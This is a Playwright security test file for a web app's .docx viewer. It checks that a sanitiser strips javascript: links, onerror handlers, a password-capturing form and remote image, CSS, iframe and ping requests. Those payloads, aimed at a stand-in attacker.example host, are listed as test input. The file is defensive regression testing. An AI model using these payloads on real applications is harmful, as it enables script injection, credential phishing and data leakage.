import { expect, test, type Page } from "@playwright/test";
import { build } from "esbuild";
import path from "node:path";

/**
 * Untrusted HTML is sanitised before it reaches a raw-HTML sink.
 *
 * THE DEFECT this fences. The `.docx` viewer in `ArtifactViewerModal` drew
 * mammoth's HTML through `dangerouslySetInnerHTML` with no gate. An emailed
 * `.docx` attachment reaches that viewer. React's own `javascript:` check does
 * not run on a string handed to `dangerouslySetInnerHTML`, so a docx hyperlink
 * to `javascript:…` ran in the app's origin on a click.
 *
 * Two tests:
 *  1. The real viewer, on `/artifacts`, opens a real `.docx` built below.
 *     mammoth converts it in the browser, as in production.
 *  2. The real `src/lib/untrustedHtml.ts`, bundled with esbuild and run in
 *     Chromium. mammoth embeds images as data URIs and draws no form, so only
 *     a direct call reaches the remote-image and form rules.
 */

// Playwright runs from `workbench/control_plane`, beside its config.
const ROOT = process.cwd();
const ATTACKER = /attacker\.example/;

// ─── A minimal .docx, zipped by hand (stored, no compression) ────────────────

const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(buf: Buffer): number {
  let c = 0xffffffff;
  for (const b of buf) c = CRC_TABLE[(c ^ b) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

function zip(files: Record<string, string>): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;
  for (const [name, text] of Object.entries(files)) {
    const data = Buffer.from(text, "utf8");
    const nameBuf = Buffer.from(name, "utf8");
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBuf.length, 26);
    locals.push(local, nameBuf, data);
    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 4);
    central.writeUInt16LE(20, 6);
    central.writeUInt32LE(crc, 16);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(data.length, 24);
    central.writeUInt16LE(nameBuf.length, 28);
    central.writeUInt32LE(offset, 42);
    centrals.push(central, nameBuf);
    offset += 30 + nameBuf.length + data.length;
  }
  const dir = Buffer.concat(centrals);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(dir.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, dir, end]);
}

const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
const DOCX = zip({
  "[Content_Types].xml":
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
    '<Default Extension="xml" ContentType="application/xml"/>' +
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>' +
    "</Types>",
  "_rels/.rels":
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
    `<Relationship Id="rId1" Type="${REL}/officeDocument" Target="word/document.xml"/>` +
    "</Relationships>",
  "word/_rels/document.xml.rels":
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
    `<Relationship Id="rIdJs" Type="${REL}/hyperlink" Target="javascript:void(window.__docxProbe='ran')" TargetMode="External"/>` +
    `<Relationship Id="rIdWeb" Type="${REL}/hyperlink" Target="https://example.com/vendor" TargetMode="External"/>` +
    "</Relationships>",
  "word/document.xml":
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="${REL}"><w:body>` +
    "<w:p><w:r><w:t>Quarterly letter</w:t></w:r></w:p>" +
    '<w:p><w:hyperlink r:id="rIdJs"><w:r><w:t>Open the report</w:t></w:r></w:hyperlink></w:p>' +
    '<w:p><w:hyperlink r:id="rIdWeb"><w:r><w:t>Vendor page</w:t></w:r></w:hyperlink></w:p>' +
    '<w:p><w:r><w:t xml:space="preserve">&lt;img src="https://attacker.example/text.png"&gt;</w:t></w:r></w:p>' +
    "</w:body></w:document>",
});

async function recordAttacker(page: Page): Promise<string[]> {
  const hits: string[] = [];
  await page.route(ATTACKER, (r) => {
    hits.push(r.request().url());
    return r.fulfill({ status: 204, body: "" });
  });
  return hits;
}

test("the .docx viewer drops a javascript: link and fetches nothing remote", async ({ page }) => {
  test.setTimeout(180_000);
  const json = (body: unknown) => ({ status: 200, contentType: "application/json", body: JSON.stringify(body) });
  await page.route("**/api/**", (r) => r.fulfill(json({ rows: [], items: [], total: 0 })));
  await page.route("**/api/agent/list", (r) => r.fulfill(json([{ name: "writer", status: "live" }])));
  await page.route(/\/api\/agent\/artifacts(\?.*)?$/, (r) =>
    r.fulfill(
      json({
        artifacts: [
          {
            agent_name: "writer",
            path: "outputs/letter.docx",
            name: "letter.docx",
            size: DOCX.length,
            modified_at: "2026-10-04T10:00:00Z",
            mime_type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            category: "outputs",
          },
        ],
      }),
    ),
  );
  await page.route(/\/api\/agent\/artifacts\/file/, (r) =>
    r.fulfill({ status: 200, contentType: "application/octet-stream", body: DOCX }),
  );
  const hits = await recordAttacker(page);

  await page.goto("/artifacts");
  const card = page.getByRole("button", { name: /writer\s*1 file/ });
  await expect(card).toBeVisible({ timeout: 120_000 });
  await card.click();
  await page.getByText("outputs", { exact: true }).first().click();
  await page.getByText("letter.docx").first().click({ force: true });
  await expect(page.getByText("Quarterly letter")).toBeVisible({ timeout: 30_000 });

  // The javascript: link keeps its text and loses its href.
  const jsLink = page.getByText("Open the report");
  const href = await jsLink.evaluate((el) => el.closest("a")?.getAttribute("href") ?? null);
  expect(href ?? "").not.toMatch(/^\s*javascript:/i);
  await jsLink.click();
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => (window as unknown as { __docxProbe?: string }).__docxProbe ?? null)).toBeNull();

  // A real link opens in a new tab, with no opener.
  const vendor = page.getByRole("link", { name: "Vendor page" });
  await expect(vendor).toHaveAttribute("href", "https://example.com/vendor");
  await expect(vendor).toHaveAttribute("target", "_blank");
  await expect(vendor).toHaveAttribute("rel", /noopener/);

  // mammoth escapes text, so an <img> typed in the document is words.
  await expect(page.getByText('<img src="https://attacker.example/text.png">')).toBeVisible();
  expect(hits).toEqual([]);
});

test("sanitizeDocxHtml strips forms, remote fetches and javascript: in Chromium", async ({ page }) => {
  test.setTimeout(120_000);
  const bundle = await build({
    entryPoints: [path.join(ROOT, "src/lib/untrustedHtml.ts")],
    bundle: true,
    write: false,
    format: "iife",
    globalName: "UntrustedHtml",
    platform: "browser",
    alias: { "@": path.join(ROOT, "src") },
    logLevel: "silent",
  });
  const hits = await recordAttacker(page);
  await page.route("**/__untrusted-html-probe", (r) =>
    r.fulfill({ status: 200, contentType: "text/html", body: "<!doctype html><html><body></body></html>" }),
  );
  await page.goto("/__untrusted-html-probe");
  await page.addScriptTag({ content: bundle.outputFiles[0].text });

  const DATA_URI =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
  const payload = [
    "<p>Hello</p>",
    '<form action="https://attacker.example/f"><input name="pw" type="password" autofocus><button>Continue</button></form>',
    '<img src="https://attacker.example/remote.png?d=1" alt="Chart">',
    '<img src="//attacker.example/proto.png">',
    '<img src="/api/email/image-proxy?url=https%3A%2F%2Fattacker.example%2Fproxied.png">',
    `<img src="${DATA_URI}" alt="dot">`,
    '<img src="https://attacker.example/x.png" srcset="https://attacker.example/2x.png 2x">',
    '<p style="background:url(https://attacker.example/bg.png)">styled</p>',
    '<svg><image href="https://attacker.example/svg.png"></image></svg>',
    '<video poster="https://attacker.example/v.jpg"></video>',
    '<table background="https://attacker.example/t.png"><tr><td>cell</td></tr></table>',
    '<a href="javascript:window.__p=1">js</a>',
    '<a href="https://example.com/ok" ping="https://attacker.example/ping">ok</a>',
    "<style>@import url(https://attacker.example/i.css);</style>",
    '<link rel="stylesheet" href="https://attacker.example/x.css">',
    '<iframe src="https://attacker.example/f.html"></iframe>',
    '<img src="x" onerror="window.__p=2">',
  ].join("");

  const out = await page.evaluate((raw) => {
    const w = window as unknown as {
      UntrustedHtml: { sanitizeDocxHtml: (s: string) => { html: string; blockedImages: number } };
    };
    const result = w.UntrustedHtml.sanitizeDocxHtml(raw);
    // Insert it into the live document: anything left that fetches, fetches now.
    document.body.innerHTML = result.html;
    return result;
  }, payload);
  await page.waitForTimeout(1500);

  expect(hits).toEqual([]);
  expect(out.html).not.toMatch(/<(form|input|button|svg|style|link|iframe|video)\b/i);
  expect(out.html).not.toMatch(/javascript:|onerror|ping=|srcset|background|autofocus/i);
  expect(out.html).toContain(DATA_URI);
  expect(out.html).toContain("Chart: image from attacker.example, not loaded");
  // remote.png, proto.png, proxied.png and x.png. "x" is same-origin and stays.
  expect(out.blockedImages).toBe(4);
  await expect(page.getByRole("link", { name: "ok" })).toHaveAttribute("target", "_blank");
  expect(await page.evaluate(() => (window as unknown as { __p?: number }).__p ?? null)).toBeNull();
});
